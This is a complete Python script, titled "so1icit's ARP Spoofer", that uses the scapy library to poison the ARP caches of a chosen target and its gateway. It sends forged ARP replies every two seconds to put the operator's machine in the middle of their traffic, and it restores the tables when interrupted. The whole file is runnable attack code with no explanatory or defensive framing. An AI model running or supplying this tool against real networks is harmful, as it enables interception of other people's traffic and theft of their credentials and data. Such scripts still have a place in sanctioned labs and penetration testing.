#!/usr/bin/env python3

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):

    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)

    packet = scapy.ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target_ip,hwsrc=target_mac)
    scapy.send(packet, count=4, verbose=False)

    print("\n[+] ARP tables restored for both devices.")


def main():
    parser = argparse.ArgumentParser(description=" so1icit's ARP Spoofer")
    parser.add_argument("target", help="Target IP address to spoof")
    parser.add_argument("gateway", help="Gateway IP address to spoof")
    args = parser.parse_args()

    target_mac = get_mac(args.target)
    gateway_mac = get_mac(args.gateway)

    if not target_mac or not gateway_mac:
        print("[!] Failed to resolve MAC addresses. Check network connectivity.")
        sys.exit(1)

    packets_sent = 0

    try:
        while True:
            spoof(args.target, target_mac, args.gateway)
            spoof(args.gateway, gateway_mac, args.target)
            packets_sent += 2
            print(f"\r[+] Packets sent: {packets_sent}", end='')
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(args.target, target_mac, args.gateway, gateway_mac)


if __name__ == "__main__":
    main()
